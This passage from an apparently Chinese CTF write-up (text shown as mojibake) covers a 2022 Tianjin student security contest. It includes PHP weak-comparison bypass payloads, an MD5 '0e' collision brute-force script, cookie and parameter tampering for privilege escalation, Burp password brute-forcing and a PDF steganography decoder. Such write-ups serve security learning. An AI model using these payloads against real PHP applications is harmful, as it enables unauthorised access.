is_numericå‡½æ•°æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä»–ä¼šæŠŠ<code>123asd</code>è¿™ç§å­—ç¬¦ä¸²æ”¹å˜ä¸º 123  ä¹Ÿå°±æ˜¯è¿™ä¹Ÿ(â€˜1234aâ€™ == 1234)ä¸ºçœŸï¼Œä¸”å› phpä¸­å¤§äºå°äºå’Œ==ï¼ˆä¸¤ä¸ªç­‰äºï¼‰æ˜¯ä¸ä¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ç›¸åŒè¿™æ ·çš„è¯ï¼Œå…¶ä¸ºå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå¤§äº2017çš„æ•°åŠ ä¸ªå­—ç¬¦ä¸²å°±è¡Œ  å¦‚  200000aaa  <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;&#125;</code>è¿™é‡Œæ³¨æ„  jsonå€¼ä¸ºå­—ç¬¦ä¸²æ—¶è¦åŠ åŒå¼•å·<br>è¿˜æœ‰ä¸€ä¸ªx22  x22éœ€è¦ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¸”è¦ç­‰äº2ï¼Œcount($x2[â€œx22â€])!==2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">      <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">          <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéå†x22è¿™ä¸ªæ•°ç»„ï¼Œè¦æ±‚ä¸èƒ½å…ƒç´ æ˜¯æœ‰â€XIPUâ€è¿™ä¸ªå­—æ ·ï¼Œä½†æ˜¯è¿˜å¿…é¡»è¦åœ¨æ•°ç»„ä¸­èƒ½å¤Ÿæ‰¾åˆ°ã€‚è¿™é‡Œarray_search()å‡½æ•°æ˜¯å­˜åœ¨å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜çš„ï¼Œå› æ­¤å°†ç¬¬äºŒä¸ªå…ƒç´ è®¾ç½®ä¸º0ï¼Œåœ¨äºâ€XIPUâ€å­—ç¬¦ä¸²æ¯”è¾ƒçš„æ—¶å€™ï¼Œ0==â€XIPUâ€æ˜¯æˆç«‹çš„ã€‚å› ä¸ºxipuä¸­æ²¡æœ‰æ•°å­—ï¼Œæœ€å <code>&#123;&quot;x21&quot;:&quot;200000aaa&quot;,&quot;x22&quot;:[[0],0]&#125;</code><br>ç¬¬ä¸‰éƒ¨åˆ†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strstr() å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›è¯¥å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å› FALSEã€‚<br>x3ä¸èƒ½ä¸º15562  ä¸”ç©¿çš„å€¼ä¸­è¦æœ‰XIPU,ä¸‹é¢åˆ¤æ–­  15562çš„md5 çš„8-16 ä½è¦å’Œæˆ‘ä»¬ä¼ çš„æ•°ç›¸ç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="comment">//45961dd50e46379442318098474e0ced</span></span><br><span class="line"><span class="comment">//0e46379442318098</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œ åˆæ˜¯è€ç”Ÿé•¿è°ˆçš„é—®é¢˜   0eæ•°å­—  ä¸”æ¯”è¾ƒçš„æ—¶å€™ä¸º== å¼±ç±»å‹æ¯”è¾ƒä¼šæŠŠ0eæ•°å­—è§£ææˆç§‘å­¦è®¡æ•°æ³•å½¢å¼ä¹Ÿå°±æ˜¯0ï¼Œé‚£æˆ‘ä»¬åªéœ€å†æ‰¾ä¸€ä¸ªè¿™æ ·çš„æ•°å°±è¡Œäº†<br>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mohu_md5</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1300000</span>):</span><br><span class="line">        t1 =  <span class="built_in">str</span>(i)+<span class="string">&#x27;XIPU&#x27;</span></span><br><span class="line">        <span class="comment">#t1 =  &#x27;XIPU&#x27;  str(i)+</span></span><br><span class="line">        md5_result = hashlib.md5(t1.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line">        <span class="comment">#print(md5_result)</span></span><br><span class="line">        <span class="keyword">if</span> md5_result[<span class="number">8</span>:<span class="number">10</span>] == <span class="string">&#x27;0e&#x27;</span>:</span><br><span class="line">            j = md5_result[<span class="number">10</span>:<span class="number">24</span>]</span><br><span class="line">            <span class="comment">#isdigit()åˆ¤æ–­æ˜¯å¦ä¸ºçº¯æ•°å­—ï¼Œæ˜¯åˆ™ä¸ºtrue åä¹‹false</span></span><br><span class="line">            <span class="keyword">if</span> j.isdigit():</span><br><span class="line">                <span class="built_in">print</span>(t1 + <span class="string">&quot;-----&gt;&quot;</span>+md5_result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">mohu_md5()</span><br><span class="line"><span class="comment">#XIPU18570-----&gt;026cba5c0e20905432015695e9eb13ba</span></span><br><span class="line"><span class="comment">#47484XIPU-----&gt;373e838b0e191027496067472b89aa6b</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªéƒ½å¯ä»¥<br>æœ€ç»ˆpayload<code>index.php?x1=0&amp;x2=&#123;&quot;x21&quot;:&quot;2018asd&quot;,&quot;x22&quot;:[[0],0]&#125;&amp;x3=47484XIPU</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154508776.png" alt="image-20220930154508776"></p><h4 id="è·³æ¥è·³å»"><a href="#è·³æ¥è·³å»" class="headerlink" title="è·³æ¥è·³å»"></a>è·³æ¥è·³å»</h4><p>150pt (å·²åšå‡º) ç®€å•è¶Šæƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930154824375.png" alt="image-20220930154824375"><br>å¼€å±€ç»™äº†test test ç›´æ¥ç™»å½•<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155017429.png" alt="image-20220930155017429"><br>ç‚¹è¿™ä¸ªç™»å½•æˆåŠŸä¼šè·³è½¬åˆ°adminï¼Œä¸”æç¤ºæƒé™ä¸è¶³ï¼Œæ˜¾ç„¶è¦è¿›è¡Œè¶Šæƒï¼ŒæŠ“ä¸ªåŒ…<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155048535.png" alt="image-20220930155048535"><br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155158626.png" alt="image-20220930155158626"><br>è¿™è¾¹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªtokenï¼Œtoken=ad0234829205b9033196ba818f7a872b<br>æ˜¾ç„¶æ˜¯md5è¿‡çš„ è§£ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155257003.png" alt="image-20220930155257003"><br>è¿™é‡Œä¸ºtest2  æˆ‘ä»¬è¿™é‡Œè‚¯å®šè¦adminçš„md5äº†,ä¸è¿‡ç»è¿‡æµ‹è¯•ä¸æ˜¯  adminçš„ ä¹Ÿè¯•äº†ä¸‹admin2 ä¹Ÿä¸æ˜¯  æœæ–­çˆ†ç ´ ï¼Œå…¶å®æ˜¯admin1çš„md5  å•Šè¿™<br>çˆ†ç ´å°±ä¸è´´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155701407.png" alt="image-20220930155701407"></p><h3 id="å„ç§æ”¹header"><a href="#å„ç§æ”¹header" class="headerlink" title="å„ç§æ”¹header"></a>å„ç§æ”¹header</h3><p>150pt (å·²åšå‡º) è€ƒç‚¹ï¼šæ”¹åŒ…<br>å¼€å±€ä¸€ä¸ªé»‘æ¡†ï¼Œæˆ‘ä»¬è¿™é‡Œç›´æ¥å¾€å·¦ä¸Šè§’çœ‹  æœ‰ä¸€ä¸ªpassword.txt  é‚£æ˜¾ç„¶æ˜¯çˆ†ç ´äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930155942088.png" alt="image-20220930155942088"><br>è®¿é—®ä¹‹  ç›´æ¥å¤åˆ¶ï¼Œè¿™é‡Œä¸ç”¨åœ¨ç”Ÿæˆå¯†ç å­—å…¸æ–‡ä»¶äº†ï¼Œç›´æ¥å¯ä»¥ç²˜è´´ä¸€ä¼šçœ‹ï¼Œéšä¾¿åœ¨å¯†ç å¤„è¾“ç‚¹ä»€ä¹ˆç„¶åæŠ“åŒ…å‘é€åˆ°intruderçˆ†ç ´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160153027.png" alt="image-20220930160153027"><br>ç‚¹clear åªåŠ passwordè¿™ä¸ªå­—æ®µçš„adminä¸ºå˜é‡ï¼Œç‚¹paylaodï¼Œç›´æ¥ç‚¹pasteå°±æŠŠåˆšåˆšåœ¨å¤åˆ¶é‚£è¾¹çš„å¯†ç ç²˜è´´<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160401337.png" alt="image-20220930160401337"><br>ç‚¹attackå¼€å§‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930160618475.png" alt="image-20220930160618475"></p><p>å¯†ç ä¸ºNsf0cuS æ—¶  å›æ˜¾äº†newpage=MjkwYmNhNzBjN2RhZTkzZGI2NjQ0ZmEwMGI5ZDgzYjkucGhw;è§£ä¸€ä¸‹base64ä¸ºï¼š290bca70c7dae93db6644fa00b9d83b9.php<br>è®¿é—®ä¹‹<code>http://ctftime1.usaas.net/web/header/290bca70c7dae93db6644fa00b9d83b9.php</code><br>æ˜¯ä¸€ä¸ªç•™è¨€æ¿<br>éšä¾¿è¾“ç‚¹ä»€ä¹ˆ<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161533441.png" alt="image-20220930161533441"></p><p>è¯´æˆ‘æ²¡ç™»å½•  å› ä¸ºè¿™é‡Œæ²¡æœ‰å¯ç™»å½•çš„åœ°æ–¹ï¼Œæœæ–­æŠ“åŒ…</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930161712966.png" alt="image-20220930161712966"><br>è¿™é‡ŒIsLogin=0æ˜¾ç„¶æ˜¯åˆ¤æ–­ç™»é™†äº†æ²¡æœ‰ç›´æ¥æ”¹æˆ1</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162050828.png" alt="image-20220930162050828"></p><p>ç„¶ååˆè¯´æˆ‘æ²¡æœ‰æƒé™ï¼Œæˆ‘ä»¬çœ‹ä¸‹é¢content=bohemian&amp;userlevel=guest&amp;Submit=%E7%95%99%E8%A8%80<br>userlevel ä¸ºguest æ˜¾ç„¶è¦æ”¹æˆç®¡ç†å‘˜ï¼Œæ¯”èµ›æ—¶è¯•äº†<code>admin admin1 manager administrator</code> éƒ½ä¸æ˜¯,æœæ–­çˆ†ç ´è¿™ä¸ªåœ°æ–¹  æœ€åæ˜¯<code>root</code> å•Šè¿™</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930162139612.png" alt="image-20220930162139612"><br><code>Flag=flag%7Bbbda40bfc4eff921a5f5faf0cfd3c195%7D</code><br><code>Flag=flag&#123;bbda40bfc4eff921a5f5faf0cfd3c195&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="æ–‡ä»¶ä¿®å¤"><a href="#æ–‡ä»¶ä¿®å¤" class="headerlink" title="æ–‡ä»¶ä¿®å¤"></a>æ–‡ä»¶ä¿®å¤</h3><p>å¼€å±€ç»™äº†ä¸€ä¸ªé™„ä»¶ï¼Œè§£å‹ä¹‹æ˜¯ä¸€ä¸ªpdf æµ‹äº†ä¸€æµ‹å•¥ä¹Ÿæ²¡æœ‰ï¼Œæ‹–åˆ°winhexä¸­çœ‹ä¸‹åå…­è¿›åˆ¶</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930163312714.png" alt="image-20220930163312714"></p><p>å¾€ä¸‹æ‹‰ä¸€æ‹‰çœ‹åˆ°æœ‰æ’å…¥çš„æ•°æ®ï¼Œåœ¨f æˆ–è€…nåé¢æ˜¯09 æˆ–è€… 20 å¹¶ä¸”éƒ½æ˜¯å…«ä½</p><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æƒ³åˆ°  æŠŠ09 20 è½¬æˆ 0æˆ–1   å› ä¸ºæ˜¯å…«ä½  æ¯”å¦‚ 01010101è¿™ä¸ªå…«ä½äºŒè¿›åˆ¶å¯ä»¥è½¬æˆ10è¿›åˆ¶ç„¶åè½¬ascii è¿™æ ·å°±æ˜¯å­—ç¬¦äº† </p><p>æœ‰äº†æ€è·¯  å¼€å§‹åšï¼Œè¿™æ ·çš„æ•°æ®é‡  æ‰‹æ’•æ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œæˆ‘ä»¬å†™è„šæœ¬</p><p>å…ˆåœ¨winhexå…¨é€‰å­—ç¬¦ï¼Œå³é”®-ã€‹edit-ã€‹copy block-ã€‹hex value</p><p>å¤åˆ¶å‡ºæ¥  ç„¶å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">alist = []</span><br><span class="line"><span class="comment">#line ä¸ºé‚£ä¸€å¤§ä¸²hex valueå€¼</span></span><br><span class="line">line = <span class="string">&quot;255044462D312E3520202009092020090D0A25B5B5B5B520202020202020200D0A312030206F626A0D0A3C3C2F547970652F436174616C6F672F50616765732032203020522F4C616E67287A682D434E&quot;</span></span><br><span class="line"><span class="comment"># å…ˆæŠŠlineä¸¤ä¸¤å­—ç¬¦ä¸€ç»„</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">alist.append(line[i:i+<span class="number">2</span>])</span><br><span class="line"><span class="comment">#åˆ¤æ–­æ¯ç»„çš„å­—ç¬¦æ˜¯ä¸æ˜¯09 æˆ–è€…20  å¹¶ä¸”  åé¢ä¸ƒä½ä¹Ÿå¿…é¡»æ˜¯  09æˆ–20  å› ä¸ºä¸­é—´å¯èƒ½ä¼šæœ‰09æˆ–20 æ‰°ä¹±æˆ‘ä»¬æˆªå–</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(alist)):</span><br><span class="line">    <span class="keyword">if</span> (alist[i] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">1</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">1</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">2</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">2</span>] == <span class="string">&quot;20&quot;</span> <span class="keyword">and</span> (alist[i+<span class="number">3</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">3</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">4</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">4</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">5</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">5</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">6</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">6</span>] == <span class="string">&quot;20&quot;</span>) <span class="keyword">and</span> (alist[i+<span class="number">7</span>] == <span class="string">&quot;09&quot;</span> <span class="keyword">or</span> alist[i+<span class="number">7</span>] == <span class="string">&quot;20&quot;</span>)):</span><br><span class="line">        s = alist[i]+alist[i+<span class="number">1</span>]+alist[i+<span class="number">2</span>]+alist[i+<span class="number">3</span>]+alist[i+<span class="number">4</span>]+alist[i+<span class="number">5</span>]+alist[i+<span class="number">6</span>]+alist[i+<span class="number">7</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#å°†09æ¢æˆ1    20æ¢æˆ0</span></span><br><span class="line">        s = s.replace(<span class="string">&quot;09&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        s = s.replace(<span class="string">&quot;20&quot;</span>,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="comment"># 00011001</span></span><br><span class="line">        <span class="comment"># 00110010D</span></span><br><span class="line">        <span class="comment"># 0110010D0A</span></span><br><span class="line">        <span class="comment"># 0010D0A25B5B5</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 00000000</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A33</span></span><br><span class="line">        <span class="comment"># 01111000</span></span><br><span class="line">        <span class="comment"># x11110000D</span></span><br><span class="line">        <span class="comment"># 1110000D0A</span></span><br><span class="line">        <span class="comment"># 01110100</span></span><br><span class="line">        <span class="comment"># t11101000D</span></span><br><span class="line">        <span class="comment"># 101000D0A35</span></span><br><span class="line">        <span class="comment"># 01100110</span></span><br><span class="line">        <span class="comment"># f001100D0A36</span></span><br><span class="line">        <span class="comment"># 01100D0A360</span></span><br><span class="line">        <span class="comment">#print(alist[i]+alist[i+1]+alist[i+2]+alist[i+3]+alist[i+4]+alist[i+5]+alist[i+6]+alist[i+7])</span></span><br><span class="line">        <span class="comment">#æ­¤æ—¶è¿˜æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²   ç”¨splitåˆ†å‰²ä¸€ä¸‹</span></span><br><span class="line">        s = s.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="comment">#åˆ¤æ–­å‡ºæ¥å°äº8çš„å­—ç¬¦ æœ€åè½¬ascii</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(i)&lt;=<span class="number">8</span>:</span><br><span class="line">                i=<span class="string">&#x27;0b&#x27;</span>+i                   </span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">eval</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#txtflag&#123;EFAWEOFJ4TUW0Tgy&#125;</span></span><br></pre></td></tr></table></figure><p>emmm è¿™é¢˜150ptæ„Ÿè§‰æœ‰ç‚¹äºæ¯”èµ›æ—¶æ²¡æœ‰è§£å‡ºæ¥ï¼Œæ—¶é—´å¤ªçŸ­äº†ï¼Œåé¢å¤ç°çš„</p><h3 id="å¥‡æ€ªçš„å›¾ç‰‡"><a href="#å¥‡æ€ªçš„å›¾ç‰‡" class="headerlink" title="å¥‡æ€ªçš„å›¾ç‰‡"></a>å¥‡æ€ªçš„å›¾ç‰‡</h3><p>å¼€å±€ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œæ˜¯raræ–‡ä»¶ï¼Œè§£å‹æœ‰å¯†ç ï¼Œé€šå¸¸æ¥è¯´ä¼ªåŠ å¯†ä¸€èˆ¬éƒ½æ˜¯zipè¿™é‡Œåº”è¯¥ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œ<br>foremostç›´æ¥åˆ†ç¦»ï¼Œä¹Ÿä»€ä¹ˆéƒ½æ²¡å‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥stringsæ¢­<br>strings å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶çš„hexæ•°æ®ä¸­çš„å¯æ˜¾å­—ç¬¦è¾“å‡ºå‡ºæ¥</p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164552419.png" alt="image-20220930164552419"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164817607.png" alt="image-20220930164817607"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164834081.png" 